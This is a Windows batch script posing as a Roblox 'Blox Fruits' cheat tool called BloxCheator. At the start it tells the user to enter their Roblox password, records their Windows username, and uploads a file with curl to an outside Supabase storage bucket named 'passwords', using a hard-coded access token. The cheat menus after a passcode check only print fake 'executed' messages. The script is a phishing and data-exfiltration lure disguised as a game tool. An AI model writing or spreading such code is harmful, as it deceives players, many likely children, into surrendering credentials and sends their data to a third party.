@echo off
chcp 65001 >nul
setlocal EnableDelayedExpansion

pause
echo hello %USERNAME%
pause

echo before any access is granted you must give your roblox password
pause

:: =========================
:: User Input (SAFE)
:: =========================
set "PASSWORD="
set /p "PASSWORD=Enter your password: "

:: =========================
:: Create file
:: =========================
set "FILENAME=username_%USERNAME%.txt"

(
echo Username: %USERNAME%
echo Created at: %DATE% %TIME%
) > "%FILENAME%"

echo File created: %FILENAME%


:: =========================
:: Upload to Supabase
:: =========================
echo Uploading to Supabase...

echo Uploading to Supabase...

curl -X POST ^
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN6b29zYWZ6Y3lqbXJxc3drZWNvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njg1MDIxMDEsImV4cCI6MjA4NDA3ODEwMX0.B_CjOoYxVQlLdgiYlaPFcUQzd1Z1T8IYaBtiJ0SUvWI" ^
  -H "Content-Type: application/octet-stream" ^
  --data-binary "@%FILENAME%" ^
  https://czoosafzcyjmrqswkeco.supabase.co/storage/v1/object/passwords/%FILENAME%



pause

:login
cls
echo ============================
echo    PASSCODE REQUIRED
echo ============================
set /p pass=Enter passcode: 

if "%pass%"=="773rt" goto access

echo.
echo Incorrect passcode!
timeout /t 2 >nul
goto login

:access
cls
echo Access Granted!
echo Welcome.
pause
title BloxCheator
color 0A
mode con cols=120 lines=40

:: =========================
:: BANNER
:: =========================
echo		██████╗ ██╗      ██████╗ ██╗  ██╗     ██████╗██╗  ██╗███████╗ █████╗ ████████╗███████╗██████╗ 
echo		██╔══██╗██║     ██╔═══██╗╚██╗██╔╝    ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
echo		██████╔╝██║     ██║   ██║ ╚███╔╝     ██║     ███████║█████╗  ███████║   ██║   █████╗  ██████╔╝
echo		██╔══██╗██║     ██║   ██║ ██╔██╗     ██║     ██╔══██║██╔══╝  ██╔══██║   ██║   ██╔══╝  ██╔══██╗
echo		██████╔╝███████╗╚██████╔╝██╔╝ ██╗    ╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗██║  ██║
echo		╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
echo.	                                                                                              

:MAIN
echo 1. Spawn Fruits
echo 2. Admin Commands
echo 3. Server Cheats
echo 4. Cheats
echo 5. ???
echo 0. Exit
echo ==========================
set /p choice=Select an option: 

if "%choice%"=="1" goto FRUITS
if "%choice%"=="2" goto ADMIN
if "%choice%"=="3" goto SERVER
if "%choice%"=="4" goto CHEATS
if "%choice%"=="5" goto PLACEHOLDER
if "%choice%"=="0" goto EXIT
goto MAIN

:FRUITS
cls
set "FRUIT_NAME="
echo ==========================
echo      BLOX FRUITS SPAWNER
echo ==========================
echo 1. Rocket
echo 2. Spin
echo 3. Blade
echo 0. Back
echo ==========================
set /p fruit=Choose a fruit: 

if "%fruit%"=="0" goto MAIN
if "%fruit%"=="1" set FRUIT_NAME=Rocket
if "%fruit%"=="2" set FRUIT_NAME=Spin
if "%fruit%"=="3" set FRUIT_NAME=Blade

if not defined FRUIT_NAME (
    echo Invalid choice!
    timeout /t 2 >nul
    goto FRUITS
)

echo Spawned %FRUIT_NAME%
pause
goto FRUITS

:ADMIN
cls
echo ADMIN COMMANDS
echo 1. God Mode
echo 2. Back
set /p admin=Choose: 
if "%admin%"=="1" echo God Mode executed
if "%admin%"=="2" goto MAIN
pause
goto ADMIN

:SERVER
cls
echo SERVER CHEATS
echo 1. Server Hop
echo 2. Back
set /p server=Choose: 
if "%server%"=="1" echo Server Hop executed
if "%server%"=="2" goto MAIN
pause
goto SERVER

:CHEATS
cls
echo CHEATS
echo 1. Infinite XP
echo 2. Back
set /p cheat=Choose: 
if "%cheat%"=="1" echo Infinite XP executed
if "%cheat%"=="2" goto MAIN
pause
goto CHEATS

:PLACEHOLDER
cls
echo Placeholder menu...
pause
goto MAIN

:EXIT
cls
echo Exiting...
timeout /t 1 >nul
exit /b
